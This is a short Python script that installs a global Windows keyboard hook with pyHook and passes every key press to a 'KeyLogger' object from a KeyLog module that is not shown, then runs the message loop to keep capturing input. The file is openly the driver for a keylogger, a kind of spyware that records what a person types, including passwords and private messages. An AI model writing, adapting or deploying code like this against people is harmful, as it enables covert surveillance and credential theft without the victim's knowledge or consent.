import pythoncom, pyHook
import KeyLog


hm = pyHook.HookManager()
K = KeyLog.KeyLogger()
hm.KeyDown = K.echo

hm.HookKeyboard()

pythoncom.PumpMessages()